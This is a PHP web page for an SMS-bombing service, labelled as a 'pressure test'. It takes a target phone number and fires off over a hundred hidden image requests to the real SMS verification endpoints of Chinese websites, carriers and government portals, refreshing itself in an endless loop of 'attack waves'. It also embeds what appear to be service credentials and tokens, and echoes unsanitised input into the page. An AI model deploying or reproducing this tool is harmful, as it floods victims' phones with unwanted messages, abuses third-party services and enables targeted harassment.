<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<title>在线短信测压</title>
<link href="css/css.css" rel="stylesheet" media="screen">
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
</head>
<body>
<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">短信测压控制台</h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">测压</span>
		<form method="GET" action="api.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要测压的手机号" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动测压线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='api.php'">停止测压线程</button>
		<button type="button" class="btn btn-info" onclick="top.location='d.html'">★多开模式</button>
		
		</div>
		</form>

<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<?php
if($d>1){
	echo "<br /><div class='progress progress-striped active'>
            <div class='progress-bar progress-bar-success' style='width: 100%'>测压进行中</div>
        </div>";
	echo "<div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>
测压线程已启动！ 轰<strong>$d</strong> , 第 <strong>$a</strong> 波攻击 , 已炸<strong>N</strong> 次. <a href='#faq' target='_blank'><i></i></a>
</div>
</div>";
    echo "<div style='display:none'>
<!--新增链接-->
<img src='https://m.ke.qq.com/cgi-bin/tool/apply_sms_code?is_ios=0&raw_phone=$d&phone=13058226398&national_code=86&from=1&bkn=1557826707&_=1596758267792 alt=''/>
<img src='https://m.yae920.cn/login/getSmsCode?mobile=$d&type=01 alt=''/>
<img src='https://sjapi.aihuishou.com/sj-api/auth/send/login-message?timestamp=1623173320783&mobile=$d alt=''/>
<img src='https://m.haiav.com/index.php?m=site&c=public&a=send_mobile_code&mobile=$d&code=undefined&ismast=1 alt=''/>
<img src='https://store.ncpa-classic.com/api/comm/smsNew?callback=jQuery17202866925711954793_1605436223502&mobile=$d alt=''/>
<img src='https://218.57.131.146/cwbase/ep/handlers/RouteHandler.ashx?action=GetPhoneVerCode&PhoneNum=action=GetPhoneVerCode&PhoneNum=$d alt=''/>
<img src='https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=$d alt=''/>
<img src='https://sapi.16888.com/app.php?mod=account&extra=mobileCode&mobile=$d alt=''/>
<img src='https://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=$d&type=Mobile&checktext=$d&_=1624877392029 alt=''/>
<img src='https://webapi.account.mihayo.com/Api/create_mobile_captcha&gameId=$d alt=''/>
<img src='https://api.qingmang.mobi/v1/account.sendVerification?token=&phone=%2B86$d&code=70428334 alt=''/>
<img src='https://static.likuso.com/user/update_shoujiyzm?callback=jQuery18307715529120842468_1624032951145&shouji=$d&yzm=51826&_=1624032964470 alt=''/>
<img src='https://m.anjuke.com/general/sendphonecode?phone=$d&captcha= alt=''/>
<img src='https://www.wuylh.com/userreg/commons/getsmscode?phone=$d alt=''/>
<img src='https://mall-cashback.tinman.cn/noRight/campaign/send-verification-code?phone=$d alt=''/>
<img src='https://www.adidas.com.cn/member/sendMobileMessage.json?mobile=$d&_=1639986531494 alt=''/>
<img src='https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&phone=$d alt=''/>
<img src='https://www.lanniuh.com/web-bin/m/weChat/weChatPublic/get_message_info?phone=$d&smsType=0&hospCode=42609044-5 alt=''/>
<img src='https://wap.10010.com/mobileService/tuiguang/sendMsg.htm?mobileNumber=$d alt=''/>
<img src='https://passport.csdn.net/account/mobileregister?action=sendMobileCode&mobile=$d alt=''/>
<img src='https://esma.iccec.cn/apis/esma/users/signup/mobile?mobile=$d&blackLoading=true&agentId=100112 alt=''/>
<img src='https://m.5khouse.com/ashx/yzm.ashx?tel=$d&ys=hqyzm&sj=0.11739289648424056 alt=''/>
<img src='https://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=$d alt=''/>
<img src='https://pass.hujiang.com/intraApi/v1/sms/send?action=SendMsg&mobile=%2B86-$d&imgcode=&token=27afe188824ede6a8ef2eb1323b9b31a&sendtype=mobilemsgpwd&msgtype=1&captchaVersion=2&user_domain=hj&business_domain=yyy_uc&hpuid=898-HpRhFammQt0QI2H-90&callback=reqwest_1585824766479513445 alt=''/>
<img src='https://mp.vasen.com/weixingmobileservice/client/getphonecodeByphoneregister?phonenumber=$d alt=''/>
<img src='https://www.longone.com.cn/servlet/user/Register?&function=AjaxGetPin1&mo=$d alt=''/>
<img src='https://lcloud.longene.com.cn/hippoWebServ!getverifycode?account=$d&pwd=Wu8471392&userType=2&userTypeMes=%E8%AF%95%E7%94%A8%E7%94%A8%E6%88%B7&deviceNum=1&hippoCoin=0&sessionkey=182h1i7U1R1a&isChild=false&phone=$d alt=''/>
<img src='https://hdh.10086.cn/common/validationIP?phone=$d alt=''/>
<img src='https://evun.geely.com/mp/sys/user/captcha?mobile=$d&type=10 alt=''/>
<img src='https://jiameng.baidu.com/portal/com/captcha?ajax=1&device=pc$d alt=''/>
<img src='https://mp.vasen.com/weixingmobileservice/client/getphonecodeByphoneregister?phonenumber=$d alt=''/>
<img src='https://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=$d alt=''/>
<img src='https://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum=$d alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$d alt=''/>
<img src='https://events.172tt.com/tianti/login/captcha?mobile=$d alt=''/>
<img src='https://www.xlcidc.com/chkName.asp?umobie=$d&lm=sendmobi&sd=0.5806221691630391 alt=''/>
<img src='https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile=$d alt=''/>
<img src='https://api.pangxiaolu.com/pangxiaolu/user/code?mobile=$d&area=86 alt=''/>
<img src='https://818ps.com/site-api/send-tel-login-code?num=$d&codeImg=undefined alt=''/>
<img src='https://m.lu.com/user/service/login/otp-login-pre-check?mobileNo=$d&skipPwd=1 alt=''/>
<img src='https://evun.geely.com/mp/sys/user/captcha?mobile=$d&type=1 alt=''/>
<img src='https://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum=$d alt=''/>
<img src='https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone=$d&appId=www_home&v=2&sig=&t=1592615855903&v=2 alt=''/>
<img src='https://ld.liandan100.com/ldmgr/api/user/sendVerifySms?platform=1&versionNum=53&&r=&partnerId=$d alt=''/>
<img src='https://passport.csdn.net/account/mobileregister?action=sendMobileCode&mobile=$d alt=''/>
<img src='https://m.jinying.com/api/send_captcha.php?mobile=$d&activity=pointcardWeb&expiry_min=3&companyNo=0145 alt=''/>
<img src='https://m.ke.qq.com/cgi-bin/tool/apply_sms_code?is_ios=0&raw_phone=$d&phone=$d&national_code=86&from=1&bkn=1557826707&_=1596758267792 alt=''/>
<img src='https://m.jinying.com/api/send_captcha.php?mobile=$d&activity=pointcardWeb&expiry_min=3&companyNo=0145 alt=''/>
<img src='https://swx.qzrc.com/home/sendnote?phone=$d&code=&imgid= alt=''/>
<img src='https://pro.ouyeel.com/api/users/userApi/sendMsg?mobile=$d alt=''/>
<img src='https://m.egou.com/validate_phone.htm?phone=$d alt=''/>
<img src='https://api.sdk.49app.com/V7/Accounts/GetCode?callback=apiRegGetPhoneCode&device=3&mobile=$d alt=''/>
<img src='https://www.52fzlt.cn/api.php?hm=$d alt=''/>
<img src='https://api.pangxiaolu.com/pangxiaolu/user/code?mobile=$d&area=86 alt=''/>
<img src='https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone=$d&type=2&v=1626775646428 alt=''/>
<img src='https://id.ifeng.com/api/simplesendmsg?mobile=$d alt=''/>
<img src='https://promo.lu.com/api/user/service/login/otp-login-pre-check?mobileNo=$d&skipPwd=1&security=0 alt=''/>
<img src='https://www.hainanwangdai.com/api/v1/user/agreement/privacy/status?utmSource=yrd_m_web&phone=$d alt=''/>
<img src='https://www.antong56.com/dc/register/sendSMS?mobile=$d alt=''/>
<img src='https://www.yichuangtianji.com/member.php?a=sms&_=1445158338&dianhua=$d alt=''/>
<img src='https://h5.17k.com/ck/user/mobile/$d/message?smsType=1&appKey=1351550300 alt=''/>
<img src='https://www.sensorsdata.cn/api/passport/sms/quest_new/$d?_t=qajgslud4i alt=''/>
<img src='https://edms.fcbox.com/hibox/weixin/getVerifyCode?mobilePhone=$d alt=''/>
<img src='https://www.51zouchuqu.com/sms/send?mobileNo=$d alt=''/>
<img src='https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber=$d alt=''/>
<img src='https://my.51banban.com/loginajax/getmobilecode/?mobilePhone=$d&type=2 alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$d alt=''/>
<img src='https://www.wuylh.com/userreg/commons/getsmscode?phone=$d alt=''/>
<img src='https://shop.sino-life.com/SL_EFS/memberRegister/sendRegistSmsCode.do?mobile=$d alt=''/>
<img src='https://wo10010sh.cn/ticket/?a=$d alt=''/>
<img src='https://m.ctscd.com/sys/ajax/User/CheckOrActivat.ashx?U_Mobile=$d&type=Mobile&checktext=$d&_=1624877392029 alt=''/>
<img src='https://h5.17k.com/ck/user/mobile/$d/message?smsType=1&appKey=1351550300 alt=''/>
<img src='https://www.100ppi.com/ecp/ppi/get_sf/get_yzm.php?m=$d alt=''/>
<img src='https://www.cdxlxs.com.cn/ebusiness/front/regist/checkMobile.do?mobile=$d alt=''/>
<img src='https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632524303&cnzz_eid=1185173797-1632490428-&showp=424x906&p= alt=''/>
<img src='https://sso1.nlc.cn/sso/currency/sendCodeToMobile?mobile=$d alt=''/>
<img src='https://w4.duoyi.com/p_user/DoNewActCards.aspx?gate=sw&jsoncallback=jQuery18303232165043277003_1483854401800&act=getsmscode&phone=$d alt=''/>
<img src='https://m.jinying.com/api/send_captcha.php?mobile=$d&activity=pointcardWeb&expiry_min=3&companyNo=0145 alt=''/>
<img src='https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632490428&cnzz_eid=1185173797-1632490428-&showp=424x906&p= alt=''/>
<img src='https://passport.eqxiu.com/eqs/sms/token?phone=$d&type=quickLogin&checkPhone=1&channel=21&version=4.4.1 alt=''/>
<img src='https://deyixueyuan.com/wapApi/getCode?source_type=h5&mobile=$d&area_code=%2B86 alt=''/>
<img src='https://www.zjzxts.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum=$d alt=''/>
<img src='https://hdh.10086.cn/common/validationIP?phone=$d alt=''/>
<img src='https://www.musicdo.cn/MiniPhone/ashx/Foundation.ashx?MethodName=GetVerificationCode&phoneNumber=$d&actionType=register alt=''/>
<img src='https://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?phoneNumber=$d&regTimeCode=1589627585503 alt=''/>
<img src='https://i.zhaopin.com/Login/LoginApi/SendBindSms?jsoncallback=jQuery16402676061029242586_1454143948438&businessType=C-Bind&t=1454143948656&_=1454143948656&mobile=$d alt=''/>
<img src='https://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage&mobile=$d alt=''/>
<img src='https://hyuser.91huayi.com/ashx/sendSmsValidateCode.ashx?mobile=$d alt=''/>
<img src='https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$d&Captcha=&_=1627172292814 alt=''/>
<img src='https://liuyan.people.com.cn/verifycode/rand4?t=1603181060151&verCode=phoneNum=$d alt=''/>
<img src='https://login.11h5.com/account/api2.php?c=quick&d=getsms&nationcode=86&phone=$d&type=2&v=1626743584518 alt=''/>
<img src='https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile=$d alt=''/>
<img src='https://ke.wooffice.net/api3/h5/sms_code?mobile=$d&jwt_token=&source_type=h5 alt=''/>
<img src='https://usercenter.i4.cn/pcuser_sendSms.action?json=&member.appId=2944&member.phone=$d&member.source=0&member.platform=1 alt=''/>
<img src='https://msgo.10010.com/lsd-message/send/captcha/phone/v1?phoneNumber=$d alt=''/>
<img src='https://i.zhaopin.com/Login/LoginApi/SendBindSms?jsoncallback=jQuery16402676061029242586_1454143948438&businessType=C-Bind&t=1454143948656&_=1454143948656&mobile=$d alt=''/>
<img src='https://www.1dagong.com/Login/sendCode?mobile=$d alt=''/>
<img src='https://m.shanzhen.me/sz/index/smsverifyp?phone=$d alt=''/>
<img src='https://z12.cnzz.com/stat.htm?id=1280063424&r=&lg=zh-cn&ntime=1632490428&cnzz_eid=1185173797-1632490428-&showp=424x906&p=%20GET%20http%3A%2F%2F6666666666.top%2Fapi.php%3Fhm%$d%26ok%3D&t=404%20Not%20Found&umuuid=17c1863b458281-03181a66cf943b-76590c31-5dc90-17c1863b45a13a&h=1&rnd=1894576511%20GET%20http://api.nysytijian.com/api/common/GetVerifyCode?phoneNumber=$d alt=''/>
<img src='https://m.paperword.com/mobile/code/v2/login/code?promote=0&mobile=$d alt=''/>
<img src='https://www.lanniuh.com/web-bin/m/weChat/weChatPublic/get_message_info?phone=$d&smsType=0&hospCode=42609044-5 alt=''/>
<img src='https://static.likuso.com/user/update_shoujiyzm?callback=jQuery18307715529120842468_1624032951145&shouji=$d&yzm=51826&_=1624032964470 alt=''/>
<img src='https://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=$d alt=''/>
<img src='https://api.passport.pptv.com/snsms/sendcode?cb=msSendCode&phoneNumber=$d&deviceId=p_1584518586025_48072460278550296&terminal=PC&channel=208000103005&uuid=0e2a64ae-e07e-49d6-852e-3de883df8003&imgCode=&format=jsonp&_=1584518959802 alt=''/>
<img src='https://m.exmail.qq.com/cgi-bin/sell_dependent?action=send_sms&t=wap_official_mgr&ef=jsnew&type=6&area=86&mobile=$d&r=0.6184749692742786 alt=''/>
<img src='https://account.ilongyuan.com.cn/index.php?s=/home/user/verify.html&random=0.8012450194754068&client_id=&verify=$d alt=''/>
<img src='https://sjapi.aihuishou.com/sj-api/auth/send/login-message?timestamp=1623173320783&mobile=$d alt=''/>
<img src='https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=$d alt=''/>
<img src='https://www.baiyangwang.com/member/index.php?act=connect_sms&op=get_captcha_new&type=1&phone=$d&appid=2002347613&ticket=t03Xu7abyRuuIZq_1EItCoYsMzW806jrX0Q7_HTYcFDXPqOuQlQiFIHp0bhn6Xaxb4oU1ZgeH1LL0w2m9hAwg0D46axuinwzpe2br0UJRGciYdhG6N9a4BxEg**&randstr=@IBY alt=''/>
<img src='https://energy.chinatowercom.cn/ikeawell_charge/ikeawell/moble/user/getValicode?cellphone=$d&vailType=10 alt=''/>
<img src='https://cuckooshop.cn/SMS?phone=$d alt=''/>
<img src='https://www.sensorsdata.cn/api/passport/sms/quest_new/$d?_t=qajgslud4i alt=''/>
<img src='https://www.cpt-world.com/sendMessageCode1.htm?mobile=$d&u_asec=099%23KAFEG7E2Ey5EhYTLEEEEEpEQz0yFZ6AwScBoa6zFSXiMW6PTDXnoD6PTBYFET6i5EEwxE7EcWOaSt3dSTPh1nznA4owxE7EcWOaSt3dGF6h1nznA4owxE7EcWOaSt3dGZ6h1nznA4owxE7EcWOaSt3dbB6h1nznA4oTXE7EFD67EE6ITEEse%2F3iSlCE9SMRXv9hjGhITEEne%2F9iSFFpESQlm83nEVEFET6ikEEw5E7EFsyaDdHQTEEi5DEEEjYFETrZtt3illdMTEHy5dYEkaquYScsTNsr3Lle0z61krQDcr6aW8yXZ95WADOnccOKc3yaIrf5ScblcsbJsLRrs3Me4S38cPav6Cle0rt2BPg1c%2F6c4DR7n%2BQeDAW1c6wU6aXGTE1LP%2F3iSlllP%2FcZddFwlluBZsyaD93llsUsP%2F3mdlllrLrZdtBalludRsYFETrudt%2FioCHGTEELP%2F3k3gy3uJrYTEHIEaCJmihwok7gq3Xta0TDfvKbObHUALH9pC%2BXv3iR6iErf0RANIEacZHgQb1EAaMWokBuYoZdIkf26mrYGRKA3iEQlQ1AnZDU01w%2FrM8wok7gqlYFETIZ4gb3kE7EMStFZYJxCD6i5DEEEbOR5SR92PaFqayhEBYFET6i5EETXE7EFD67EE6ITEEse%2F3iSlCjISMRXv9hjGHQTEEi5DEEESYFEwredt3ilppRjYPWfd0JEDYFEhfaXaQEubPi5D67EERpCDqSXXyIWYUZGDXm%2BE7E6WOaSthxnY6c3D0LtGE%3D%3D&u_atype=2 alt=''/>
<img src='https://api.sms.cn/sms/?ac=send&uid=sun98&pwd=5a509d25c595fcec2561652992f1915b&template=542423&mobile=$d alt=''/>
<img src='https://id.ifeng.com/api/simplesendmsg?mobile=$d&comefrom=7&auth=&msgtype=0 alt=''/>
<img src='https://ka.niwodai.com/loans-mobile/validatecode.do?method=refresh&date=1557210332912interval=60&phone=$d alt=''/>
<img src='https://v4.passport.sohu.com/i/smcode/mobile/sblmobile?mobile=$d&way=1&appid=116005&callback=passport403_cb1596534389025&_=1596534591810 alt=''/>
<img src='https://msgo.10010.com/lsd-message/send/captcha/phone/v1?phoneNumber=$d alt=''/>
<img src='https://app-api.shop.ele.me/arena/invoke/?method=OpenAPIRegisterService.sendVerifyCode&site_id=gw_Cloudgame&geetest_challenge=&geetest_validate=&geetest_seccode=&reportData=number=$d alt=''/>
<img src='https://www.1dagong.com/Login/sendCode?mobile=$d alt=''/>
<img src='https://sso1.nlc.cn/sso/currency/sendCodeToMobile?mobile=$d alt=''/>
<img src='https://www.51hawo.com/apollo/MobileCode/sendMobileCode?mobile=$d&sms_type=101&register_from=20000091 alt=''/>
<img src='https://reg.qun.hk/v2/captcha/send?phone=$d&sign=22758ac39001fab745244b07c6a0d1d5&product=qun alt=''/>
<img src='https://sso.360che.com/?c=code&_0.6284588856010609&tel=code=$d alt=''/>
<img src='https://bdp.haoyisheng.com/bdp/checkCode/getChkCode?timestamp=1600272327075mobileNum=$d alt=''/>
<img src='https://mytxkt.grazy.cn/wapApi/getCode?source_type=h5&mobile=$d&area_code=%2B86 alt=''/>
<img src='https://m.jinying.com/api/send_captcha.php?mobile=$d&activity=pointcardWeb&expiry_min=3&companyNo=0145 alt=''/>
<img src='https://www.1dagong.com/Login/sendCode?mobile=$d alt=''/>
<img src='https://www.365liye.com/API/Site/Member/SendCode?tel=$d alt=''/>
<img src='https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$d alt=''/>
<img src='https://gj.liansuosoft.com/ShopRegister/VCode?rand=0.3306040567511852&code=$d alt=''/>
<img src='https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=$d alt=''/>
<img src='https://m.lu.com/user/service/login/otp-login-pre-check?mobileNo=$d&skipPwd=1 alt=''/>
<img src='https://m.95303.com/api/OrderYx/GetCodeBySMS?mobile=$d&_=1626625066773 alt=''/>
<img src='https://esma.iccec.cn/apis/esma/users/signup/mobile?mobile=$d&blackLoading=true&agentId=100112 alt=''/>
<img src='https://iclass.ruijie.com.cn/icmgr/rest/techReg/sms?timeStamp=1605428709505&phoneNo=$d alt=''/>
<img src='https://app.zhuanzhuan.com/zz/transfer/getCaptcha?type=1&mobile=$d alt=''/>
<img src='https://www.zoneidc.com/user/sendmobi.asp?mobi=$d alt=''/>
<img src='https://hdh.10086.cn/common/validationIP?phone=$d alt=''/>
<img src='https://host.convertlab.com/sms/get?mobile=$d&name=Convertlab&token=4080fdef3cb44298852d226af95b2502&type=form&uuid=4a48dbfe8e1d49ab87715d2ed8e6e79d alt=''/>
<img src='https://m.jinying.com/api/send_captcha.php?mobile=$d&activity=pointcardWeb&expiry_min=3&companyNo=0145 alt=''/>
<img src='https://www.zoneidc.com/user/sendmobi.asp?mobi=$d alt=''/>
<img src='https://cloud.nucarf.com/rest/querySmsCode?phoneNum=$d alt=''/>
<img src='https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$d alt=''/>
<img src='https://open.leju.com/game/member/sendcode.html?phone=$d alt=''/>
<img src='https://sso-c.souche.com/loginApi/getCaptchaUrlByPhone.json?app=tangeche&amp;phone=$d alt=''/>
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=api.php?hm=$d&amp;c=$a'>";
}else{
}
?>
<div class="bs-callout bs-callout-info">
    
</div>
</div>
</script>
<script language="javascript" type="text/javascript" src="http://js.users.51.la/18759442.js"></script>
</body>
</html>